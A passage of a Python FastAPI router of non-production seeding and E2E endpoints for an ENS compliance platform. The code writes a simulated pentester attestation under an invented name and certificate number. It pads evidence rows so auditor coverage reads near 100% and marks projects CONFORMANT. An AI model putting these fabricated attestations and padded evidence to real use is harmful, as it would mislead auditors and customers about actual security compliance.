    if tier == "ALTA":
        try:
            await seed_pentest_auth_data(key=key, db=db)
        except Exception as exc:  # noqa: BLE001
            extras_errors.append(f"pentest: {exc}")
            await db.rollback()

    # ── STEP 5b · pentest AUTOPILOT REAL (solo ALTA · el "90% Fulkro") ──
    # Entre Gate 1 (autorización/scope) y Gate 2 (atestación humana del pentester
    # OSCP/CPSTIC) TODO lo hace el autopilot determinista de Fulkro: escaneo MCP →
    # ZFP 1-5 → enrich CVSS/EPSS → mapeo ENS Anexo II + MITRE → Finding canónico →
    # evidencia R6 append-only → coverage + manifest. ALTO pausa en paused_gate2;
    # aquí simulamos la atestación humana (el 10% restante = el autónomo externo).
    if tier == "ALTA":
        try:
            await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
            await set_tenant_context(db, client_id=cid, project_id=pid)
            from datetime import datetime as _dt2, timezone as _tz2
            from backend.app.motors.m08_verification.models import (
                EvidenceRecord as _EvRec,
            )
            from backend.app.motors.m08_verification.autopilot.orchestrator import (
                orchestrate_run as _orchestrate,
            )
            run_row = (await db.execute(
                select(VerificationRun).where(
                    VerificationRun.project_id == pid,
                    VerificationRun.deleted_at.is_(None),
                ).order_by(VerificationRun.created_at.desc()).limit(1)
            )).scalar_one_or_none()
            if run_row is not None:
                already = (await db.execute(text(
                    "SELECT count(*) FROM verification_findings WHERE run_id=:r "
                    "AND deleted_at IS NULL"
                ), {"r": str(run_row.id)})).scalar()
                if not int(already or 0):
                    # categoría ALTO (el seed la deja MEDIO) + scope realista ALTA
                    run_row.category = "ALTO"
                    run_row.scope_jsonb = {
                        "targets": ["10.20.0.10", "10.20.0.11", "vpn.cliente-alta.es"],
                        "web_apps": ["https://portal.cliente-alta.es",
                                     "https://api.cliente-alta.es"],
                        "cloud_accounts": [
                            {"type": "aws", "asset_name": "prod-eu-account"},
                        ],
                        "exclusions": [],
                    }
                    await db.flush()
                    summary = await _orchestrate(
                        db, run_row.id,
                        candidates_override=_alta_pentest_candidates(),
                        enable_triage=False,  # determinista · sin LLM (no cuelga live)
                    )
                    pentest_findings = int(summary.get("findings_persisted", 0))
                    # Gate 2 humano · atestación del pentester acreditado (el 10%)
                    run_row.external_pentester_name = "D. Iván Serrano Gómez"
                    run_row.external_pentester_cert = (
                        "OSCP nº OS-118734 · habilitado CCN CPSTIC"
                    )
                    run_row.autopilot_status = "completed"
                    run_row.status = "completed"
                    db.add(_EvRec(
                        project_id=pid, client_id=None, run_id=run_row.id,
                        finding_id=None, run_manifest_hash=run_row.run_manifest_hash,
                        actor="human:Iván Serrano (OSCP/CPSTIC)",
                        action="gate2.attested", component="m08:autopilot.gate2",
                        payload={
                            "attested_by": "D. Iván Serrano Gómez",
                            "cert": "OSCP OS-118734 · CPSTIC",
                            "opinion": ("Validacion manual de explotacion segura "
                                        "completada · hallazgos del autopilot "
                                        "confirmados · sin falsos positivos."),
                            "attested_at": _dt2.now(_tz2.utc).isoformat(),
                        },
                    ))
                else:
                    pentest_findings = int(already or 0)
            await db.commit()
        except Exception as exc:  # noqa: BLE001
            extras_errors.append(f"pentest-autopilot: {exc}")
            await db.rollback()

    # ── STEP 6-9 · evidencias + políticas + firmas + declaración draft ──
    try:
        await seed_conformidad_ready_data(tier=tier, key=key, db=db)
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"conformidad-ready: {exc}")
        await db.rollback()

    # ── COBERTURA evidencia↔medida ──
    # El seed crea evidencias con measure_code NULL → el heatmap del auditor da
    # 0% (parece NO implantado). Asignamos cada medida aplicable a una evidencia
    # (scan_status='clean') y creamos extras hasta cubrir TODAS las aplicables →
    # el auditor ve cobertura real ~100% (sistema implantado de verdad).
    try:
        await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
        await set_tenant_context(db, client_id=cid, project_id=pid)
        applicable = [r[0] for r in (await db.execute(text(
            "SELECT m.codigo FROM dda_entries e JOIN ens_measures m "
            "ON m.id = e.measure_id WHERE e.project_id=:p "
            "AND e.aplicabilidad <> 'no_aplica' AND e.deleted_at IS NULL "
            "ORDER BY m.codigo"
        ), {"p": str(pid)})).all()]
        if applicable:
            # critical_high_requirement=3 (gap service): las medidas críticas
            # (op.* / mp.*) exigen 3 evidencias para 'covered'. Garantizamos >=3
            # por medida aplicable → cobertura 100% (system implantado perfecto).
            target = 3
            existing = {
                r[0]: int(r[1]) for r in (await db.execute(text(
                    "SELECT measure_code, count(*) FROM evidence WHERE project_id=:p "
                    "AND measure_code IS NOT NULL AND deleted_at IS NULL "
                    "GROUP BY measure_code"
                ), {"p": str(pid)})).all()
            }
            needed: list[str] = []
            for mc in applicable:
                deficit = target - existing.get(mc, 0)
                needed.extend([mc] * max(0, deficit))
            free_ev = [r[0] for r in (await db.execute(text(
                "SELECT id FROM evidence WHERE project_id=:p AND deleted_at IS NULL "
                "AND measure_code IS NULL"
            ), {"p": str(pid)})).all()]
            i = 0
            for eid in free_ev:
                if i >= len(needed):
                    break
                await db.execute(text(
                    "UPDATE evidence SET measure_code=:mc, scan_status='clean' "
                    "WHERE id=:e"
                ), {"mc": needed[i], "e": str(eid)})
                i += 1
            for mc in needed[i:]:
                db.add(Evidence(
                    id=uuid.uuid4(), project_id=pid, tipo="document",
                    vigente=True, measure_code=mc, scan_status="clean",
                ))
            await db.commit()
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"evidence-coverage: {exc}")
        await db.rollback()

    # ── EXTRAS · E-040 + ruta CONFORMANT + distintivo E-049 (+ cert ext) ──
    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
    await set_tenant_context(db, client_id=cid, project_id=pid)

    e040_pct: float | None = None
    try:
        from backend.app.motors.m06_document_factory.service import (
            DocumentFactoryService,
        )
        from backend.app.motors.m06_document_factory.informe_final_generator import (
            build_informe_final_context,
        )
        svc = DocumentFactoryService(db)
        await svc.load_template_metadata_from_catalog()
        e040_ctx = await build_informe_final_context(db, pid)
        e040_pct = float(e040_ctx["informe"]["cumplimiento_global"])
        await svc.generate_document(
            project_id=pid, template_codigo="E-040", context=e040_ctx,
            generate_pdf=False, sign=False, generated_by="sim",
        )
        await db.commit()
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"e040: {exc}")
        await db.rollback()
        await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
        await set_tenant_context(db, client_id=cid, project_id=pid)

    # ruta de conformidad → CONFORMANT
    try:
        # el commit del E-040 resetea SET LOCAL ROLE → re-fijar bypassrls + tenant
        await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
        await set_tenant_context(db, client_id=cid, project_id=pid)
        from backend.app.models.conformity_lifecycle import ConformityRouteRow
        route_type = "declaracion_basica" if tier == "BASICA" else "certificacion_enac"
        existing_route = (await db.execute(
            select(ConformityRouteRow)
            .where(ConformityRouteRow.project_id == pid)
            .order_by(ConformityRouteRow.created_at.desc())
        )).scalars().first()
        if existing_route is None or existing_route.status not in (
            "CONFORMANT", "REGISTERED",
        ):
            db.add(ConformityRouteRow(
                project_id=pid, route_type=route_type, status="CONFORMANT",
            ))
        await db.commit()
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"conformity-route: {exc}")
        await db.rollback()

    # distintivo E-049 + REGISTERED (+ cert externo MEDIA/ALTA)
    distintivo_id: str | None = None
    try:
        await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
        await set_tenant_context(db, client_id=cid, project_id=pid)
        from backend.app.motors.m27_conformity.distintivo_persistence import (
            attach_distintivo_on_registered, attach_external_certificate,
        )
        dist = await attach_distintivo_on_registered(db, pid, generated_by="sim")
        distintivo_id = (
            dist.get("distintivo_document_id") or dist.get("document_id")
            if isinstance(dist, dict) else None
        )
        if tier in ("MEDIA", "ALTA"):
            await attach_external_certificate(
                db, pid, filename="cert_enac.pdf",
                content=b"%PDF-1.5 certificado entidad de certificacion acreditada ENAC",
                content_type="application/pdf",
            )
        await db.commit()
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"distintivo: {exc}")
        await db.rollback()

    # ── plan de adecuación (project_plans + wbs_tasks) → vista plan auditor ──
    try:
        await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
        await set_tenant_context(db, client_id=cid, project_id=pid)
        has_plan = (await db.execute(text(
            "SELECT count(*) FROM project_plans WHERE project_id=:p "
            "AND deleted_at IS NULL"
        ), {"p": str(pid)})).scalar()
        if not int(has_plan or 0):
            from datetime import date as _date, timedelta as _td
            from backend.app.motors.m17_planning.planning_service import (
                generate_plan,
            )
            await generate_plan(db, pid, tier, _date.today() - _td(days=30))
            await db.execute(text(
                "UPDATE project_plans SET estado='approved' WHERE project_id=:p"
            ), {"p": str(pid)})
        await db.commit()
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"plan: {exc}")
        await db.rollback()

    # ── dossier run (audit_preparation_runs) → vista documents auditor ──
    try:
        await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
        await set_tenant_context(db, client_id=cid, project_id=pid)
        has_run = (await db.execute(text(
            "SELECT count(*) FROM audit_preparation_runs WHERE project_id=:p"
        ), {"p": str(pid)})).scalar()
        if not int(has_run or 0):
            from datetime import datetime as _dt, timezone as _tz
            from backend.app.models.audit_prep import AuditPreparationRun
            db.add(AuditPreparationRun(
                project_id=pid, categoria=tier, estado="dossier_generated",
                dossier_generated_at=_dt.now(_tz.utc), readiness_score=95,
            ))
        await db.commit()
    except Exception as exc:  # noqa: BLE001
        extras_errors.append(f"dossier-run: {exc}")
        await db.rollback()

    # ── counts finales ──
    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
    dda_aplic = (await db.execute(text(
        "SELECT count(*) FROM dda_entries WHERE project_id=:p "
        "AND aplicabilidad <> 'no_aplica' AND deleted_at IS NULL"
    ), {"p": str(pid)})).scalar()
    ev_count = (await db.execute(text(
        "SELECT count(*) FROM evidence WHERE project_id=:p AND deleted_at IS NULL"
    ), {"p": str(pid)})).scalar()
    mag_count = (await db.execute(text(
        "SELECT count(*) FROM magerit_assets a JOIN magerit_analysis an "
        "ON a.analysis_id = an.id WHERE an.project_id=:p"
    ), {"p": str(pid)})).scalar() or 0
    route = (await db.execute(text(
        "SELECT status FROM conformity_routes WHERE project_id=:p "
        "ORDER BY created_at DESC LIMIT 1"
    ), {"p": str(pid)})).scalar()

    return SeedFullImplantationResponse(
        tier=tier, project_id=str(pid), client_id=str(cid),
        dda_aplicables=int(dda_aplic or 0), evidence_count=int(ev_count or 0),
        magerit_assets=int(mag_count or 0),
        conformity_route_state=str(route or "NONE"),
        distintivo_document_id=distintivo_id,
        e040_cumplimiento_global=e040_pct,
        pentest_findings=pentest_findings,
        extras_errors=extras_errors,
        note=f"Implantacion {tier} para '{project_nombre}' (cif {cif})",
    )


# ── FRENTE M · token del portal auditor para E2E 3 niveles (MEDIA/ALTA) ──
class AuditorPortalTokenResponse(BaseModel):
    project_id: str
    token: str
    otp: str | None
    portal_path: str


@router.post(
    "/auditor-portal-token",
    response_model=AuditorPortalTokenResponse,
)
async def auditor_portal_token(
    project_id: str | None = Query(
        default=None,
        description="Proyecto destino · si se omite usa el test project E2E",
    ),
    db: AsyncSession = Depends(get_db),
) -> AuditorPortalTokenResponse:
    """FRENTE M · mintea un magic-link AUDITOR_PORTAL_ENAC válido para que el
    actor AUDITOR de los specs E2E (cycle MEDIA/ALTA) entre al portal.

    Devuelve el token JWT + el OTP (purpose ``requires_otp=True``) para recorrer
    el step-up sin leer el email. Env-gated non-production (doble defensa).

    El CI ``admin-polish-empirical.yml`` ya invoca este endpoint con fallback
    ``::warning::``; aquí pasa a ser real (corrección de briefing FRENTE M · M2).
    """
    _require_non_production()
    from backend.app.motors.m12_magic_link.purposes import MagicLinkPurpose
    from backend.app.motors.m12_magic_link.schemas import MagicLinkGenerateRequest
    from backend.app.motors.m12_magic_link.service import MagicLinkService

    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    if project_id:
        target = (
            await db.execute(
                select(Project).where(Project.id == uuid.UUID(project_id))
            )
        ).scalar_one_or_none()
        if target is None:
            raise HTTPException(404, f"Project {project_id} no existe")
    else:
        test_client = (
            await db.execute(select(Client).where(Client.cif == _TEST_CLIENT_CIF))
        ).scalar_one_or_none()
        if test_client is None:
            raise HTTPException(
                400,
                "Test client no existe · llamar /_dev/create-test-client primero",
            )
        target = (
            await db.execute(
                select(Project).where(
                    Project.client_id == test_client.id,
                    Project.nombre == _TEST_PROJECT_NOMBRE,
                )
            )
        ).scalar_one_or_none()
        if target is None:
            raise HTTPException(
                400,
                "Test project no existe · llamar /_dev/create-test-client primero",
            )

    result = await MagicLinkService(db).generate_magic_link(
        MagicLinkGenerateRequest(
            project_id=target.id,
            purpose=MagicLinkPurpose.AUDITOR_PORTAL_ENAC,
            recipient_email="auditor.enac@test.fulkro.es",
        ),
        base_url="http://localhost",
    )
    await db.commit()

    return AuditorPortalTokenResponse(
        project_id=str(target.id),
        token=result.token,
        otp=result.otp,
        portal_path=f"/auditor-portal/{result.token}/summary",
    )


# ── Reset del estado de CICLO del proyecto test (idempotencia E2E robusta) ──
_CYCLE_RESET_TABLES = (
    "basic_declarations",
    "conformity_submissions",
    "conformity_state_snapshots",
    "conformity_routes",
    "documents",
    "evidence",
    "dda_entries",
    "signing_intents",
)


@router.post("/reset-test-cycle")
async def reset_test_cycle(
    project_id: str | None = Query(
        default=None, description="Proyecto · si se omite usa el test project E2E"
    ),
    db: AsyncSession = Depends(get_db),
) -> dict[str, Any]:
    """Limpia el estado de CICLO de vida de un proyecto test para que un spec E2E
    parta de cero (sin pollution multi-fila de runs previos: declaraciones firmadas,
    intents, documentos, evidencias…).

    Root-cause fix de la pollution del dev DB: las specs legacy asumen BD limpia.
    Borra con FK triggers OFF (datos de test · session_replication_role=replica) +
    savepoint por tabla (robusto si alguna no tiene project_id). Env-gated non-prod.
    """
    _require_non_production()
    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    if project_id:
        pid = uuid.UUID(project_id)
    else:
        test_client = (
            await db.execute(select(Client).where(Client.cif == _TEST_CLIENT_CIF))
        ).scalar_one_or_none()
        if test_client is None:
            raise HTTPException(400, "Test client no existe · create-test-client primero")
        proj = (
            await db.execute(
                select(Project).where(
                    Project.client_id == test_client.id,
                    Project.nombre == _TEST_PROJECT_NOMBRE,
                )
            )
        ).scalar_one_or_none()
        if proj is None:
            raise HTTPException(400, "Test project no existe · create-test-client primero")
        pid = proj.id

    # bypass RLS + permiso de GUC session_replication_role (delegado al rol bypass ·
    # auditoría 2026-06-07 · fulkro_app ya no es superuser). SET LOCAL revierte al fin de tx.
    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
    await db.execute(text("SET LOCAL session_replication_role = 'replica'"))
    deleted: dict[str, Any] = {}
    # signing_events: vía intents padre (sin project_id propio garantizado)
    try:
        async with db.begin_nested():
            await db.execute(
                text(
                    "DELETE FROM signing_events WHERE signing_intent_id IN "
                    "(SELECT id FROM signing_intents WHERE project_id = :pid)"
                ),
                {"pid": str(pid)},
            )
        deleted["signing_events"] = "ok"
    except Exception as exc:  # noqa: BLE001
        deleted["signing_events"] = f"skip:{type(exc).__name__}"
    for tbl in _CYCLE_RESET_TABLES:
        try:
            async with db.begin_nested():
                res = await db.execute(
                    text(f"DELETE FROM {tbl} WHERE project_id = :pid"),
                    {"pid": str(pid)},
                )
            deleted[tbl] = res.rowcount
        except Exception as exc:  # noqa: BLE001
            deleted[tbl] = f"skip:{type(exc).__name__}"
    await db.execute(text("SET LOCAL session_replication_role = 'origin'"))
    await db.commit()
    return {"project_id": str(pid), "deleted": deleted}


# ════════════════════════════════════════════════════════════════════
# Proyecto FIJO E2E rico · unblock SAN-E v3 (san_e_v3/mb3_* + mb4_*) +
# admin-settings + paneles project-scoped data-dependent.
# ════════════════════════════════════════════════════════════════════


class SeedRichDemoResponse(BaseModel):
    project_id: str
    client_id: str
    analysis_id: str | None
    assets_count: int
    risks_count: int
    dda_entries_count: int
    note: str


@router.post("/seed-rich-demo-project", response_model=SeedRichDemoResponse)
async def seed_rich_demo_project(
    db: AsyncSession = Depends(get_db),
) -> SeedRichDemoResponse:
    """Crea (idempotente) el proyecto FIJO E2E con UUID determinista
    `00000000-0000-0000-0000-000000000001` bajo el cliente de test, sembrado
    con datos ricos: MAGERIT (8 assets + 12 risks) + DdA ALTA (73 entries).

    Las specs SAN-E v3 (`san_e_v3/mb3_*` + `mb4_*`) y `admin-settings`
    hardcodean ese UUID para navegar a `/admin/projects/{id}/<tab>` sin
    resolver el proyecto del cliente de test. Sin un proyecto en ese UUID las
    páginas project-scoped muestran el gate "proyecto no encontrado" → ~38
    specs fallan en cascada. Con este seed los paneles renderizan estructura +
    contenido (MAGERIT assets/risks, DdA entries, discovery, etc.).

    Idempotente: si el proyecto ya existe con >=8 assets y >=70 DdA entries,
    devuelve el estado existente sin re-generar. Reusa las constantes
    `_THREAT_CATALOG_SEED` / `_ASSETS_SEED` / `_RISKS_SEED` y `DdaService`
    (OPS-026 DRY · idéntico patrón a seed-magerit-alta-data + seed-dda-alta).
    """
    _require_non_production()

    await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))

    # 1. Cliente DEDICADO aislado (NO el cliente de test compartido · ver nota
    #    en _FIXED_DEMO_CLIENT_CIF · evita contaminar la resolución R27 LIMIT 1
    #    del portal cliente que rompería los specs cliente compartidos).
    test_client = (
        await db.execute(
            select(Client).where(Client.cif == _FIXED_DEMO_CLIENT_CIF)
        )
    ).scalar_one_or_none()
    if test_client is None:
        test_client = Client(
            id=uuid.uuid4(),
            nombre=_FIXED_DEMO_CLIENT_NOMBRE,
            cif=_FIXED_DEMO_CLIENT_CIF,
        )
        db.add(test_client)
        await db.flush()

    # 2. Proyecto FIJO (get-or-create por UUID determinista · ALTA)
    fixed_project = await db.get(Project, _FIXED_DEMO_PROJECT_ID)
    if fixed_project is None:
        fixed_project = Project(
            id=_FIXED_DEMO_PROJECT_ID,
            client_id=test_client.id,
            nombre=_FIXED_DEMO_PROJECT_NOMBRE,
            categoria_objetivo="ALTA",
            estado="active",
            lifecycle_state="ACTIVE",
        )
        db.add(fixed_project)
        await db.flush()
    else:
        # Asegura categoría ALTA + pertenencia al cliente dedicado (idempotente ·
        # re-vincula el proyecto fijo desde el cliente compartido si una versión
        # anterior del seed lo creó allí).
        if fixed_project.categoria_objetivo != "ALTA":
            fixed_project.categoria_objetivo = "ALTA"
        if fixed_project.client_id != test_client.id:
            fixed_project.client_id = test_client.id
        await db.flush()

    # 3. Tenant context para RLS (MAGERIT + DdA)
    await set_tenant_context(
        db, client_id=test_client.id, project_id=fixed_project.id,
    )

    # 4. Threat catalog (idempotent · code UNIQUE)
    existing_threats = set((await db.execute(
        select(MageritThreat.code).where(
            MageritThreat.code.in_([t["code"] for t in _THREAT_CATALOG_SEED])
        )
    )).scalars().all())
    for tdata in _THREAT_CATALOG_SEED:
        if tdata["code"] in existing_threats:
            continue
        db.add(MageritThreat(
            code=tdata["code"],
            name=tdata["name"],
            group_code=tdata["group_code"],
            description=tdata["description"],
            affected_dimensions=tdata["affected_dimensions"],
        ))
    await db.flush()

    # 5. MageritAnalysis (get-or-create · active)
    analysis = (await db.execute(
        select(MageritAnalysis)
        .where(MageritAnalysis.project_id == fixed_project.id)
        .where(MageritAnalysis.deleted_at.is_(None))
        .order_by(MageritAnalysis.created_at.desc())
        .limit(1)
    )).scalar_one_or_none()
    if analysis is None:
        analysis = MageritAnalysis(
            project_id=fixed_project.id,
            name="AR-2026-E2E-FIXED",
            version=1,
            status="completed",
            calculation_mode="qualitative",
        )
        db.add(analysis)
        await db.flush()

    # 6. Assets + risks (idempotent · skip si >=8 assets)
    existing_assets_count = int((await db.execute(
        select(text("count(*)"))
        .select_from(MageritAsset)
        .where(MageritAsset.analysis_id == analysis.id)
        .where(MageritAsset.deleted_at.is_(None))
    )).scalar_one() or 0)

    if existing_assets_count < 8:
        assets_by_code: dict[str, MageritAsset] = {}
        for code, name, type_code, desc, vd, vi, vc, va, vt in _ASSETS_SEED:
            asset = MageritAsset(
                analysis_id=analysis.id,
                code=code,
                name=name,
                asset_type_code=type_code,
                description=desc,
                owner="E2E Test Owner",
                value_d=vd, value_i=vi, value_c=vc, value_a=va, value_t=vt,
            )
            db.add(asset)
            await db.flush()
            assets_by_code[code] = asset
        for asset_code, t_code, prob, dd, di, dc, da, dt in _RISKS_SEED:
            asset = assets_by_code[asset_code]
            db.add(MageritThreatAssessment(
                analysis_id=analysis.id,
                asset_id=asset.id,
                threat_code=t_code,
                probability=prob,
                degradation_d=dd, degradation_i=di, degradation_c=dc,
                degradation_a=da, degradation_t=dt,
            ))
        await db.flush()

    risks_total = int((await db.execute(
        select(text("count(*)"))
        .select_from(MageritThreatAssessment)
        .where(MageritThreatAssessment.analysis_id == analysis.id)
    )).scalar_one() or 0)
    assets_total = int((await db.execute(
        select(text("count(*)"))
        .select_from(MageritAsset)
        .where(MageritAsset.analysis_id == analysis.id)
        .where(MageritAsset.deleted_at.is_(None))
    )).scalar_one() or 0)

    # 7. DdA ALTA 73 entries (idempotent · skip si >=70)
    existing_dda = int((await db.execute(
        select(text("count(*)"))
        .select_from(DdaEntry)
        .where(DdaEntry.project_id == fixed_project.id)
        .where(DdaEntry.deleted_at.is_(None))
    )).scalar_one() or 0)
    if existing_dda < 70:
        from backend.app.motors.m03_dda.service import DdaService
        svc = DdaService(db)
        await svc.generate_dda(
            project_id=fixed_project.id,
            system_category=CategoriaSistema.ALTA,
            responsable="E2E Test RSEG",
            enforce_gates=False,
        )
        await db.execute(
            text(
                "UPDATE dda_entries SET aplicabilidad='aplica', "
                "estado_implementacion='implantada' "
                "WHERE project_id = :pid AND deleted_at IS NULL "
                "AND aplicabilidad IS DISTINCT FROM 'no_aplica'"
            ),
            {"pid": str(fixed_project.id)},
        )
    dda_total = int((await db.execute(
        select(text("count(*)"))
        .select_from(DdaEntry)
        .where(DdaEntry.project_id == fixed_project.id)
        .where(DdaEntry.deleted_at.is_(None))
    )).scalar_one() or 0)

    await db.commit()
    return SeedRichDemoResponse(
        project_id=str(fixed_project.id),
        client_id=str(test_client.id),
        analysis_id=str(analysis.id),
        assets_count=assets_total,
        risks_count=risks_total,
        dda_entries_count=dda_total,
        note="Proyecto fijo E2E sembrado · MAGERIT + DdA ALTA",
    )
